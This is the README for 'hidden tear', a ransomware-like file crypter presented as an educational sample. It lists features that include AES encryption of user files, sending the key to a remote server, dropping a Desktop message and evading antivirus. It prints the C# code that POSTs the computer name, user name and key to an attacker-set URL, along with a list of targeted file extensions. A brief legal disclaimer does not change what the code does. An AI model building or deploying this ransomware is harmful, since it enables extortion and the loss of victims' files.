         _     _     _     _              _                  
        | |   (_)   | |   | |            | |                 
        | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
        | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
        | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
        |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
                                                     
It's a ransomware-like file crypter sample which can be modified for specific educational purposes. 

**Features**
* Uses AES algorithm to encrypt files.
* Sends encryption key to a server.
* Encrypted files can be decrypt in decrypter program with encryption key.
* Creates a text file in Desktop with given message.
* Small file size (12 KB)
* Doesn't detected to antivirus programs (15/08/2015) http://nodistribute.com/result/6a4jDwi83Fzt

**Demonstration Video**

https://www.youtube.com/watch?v=LtiRISepIfs

**Usage**

* You need to have a web server where the info remains. Change this line with your URL. (You better use HTTPS for more security)

  `string targetURL = "http://localhost/info/index.php";`

* The script do the POST request to the server (targetURL). Sending process running in `SendPassword()` function

  ```
  
using (var client = new WebClient())
   {
       var values = new NameValueCollection();
       values["computerName"] = computerName;
       values["userName"] = userName;
       values["password"] = password;
       client.UploadValues(targetURL, "POST", values);
   }
   
  ```
* Example of target file extensions that can be changed:

```
var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
```
**Article: Destroying The Encryption of Hidden Tear Ransomware** 

http://www.utkusen.com/blog/destroying-the-encryption-of-hidden-tear-ransomware.html

**Legal Warning** 

While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
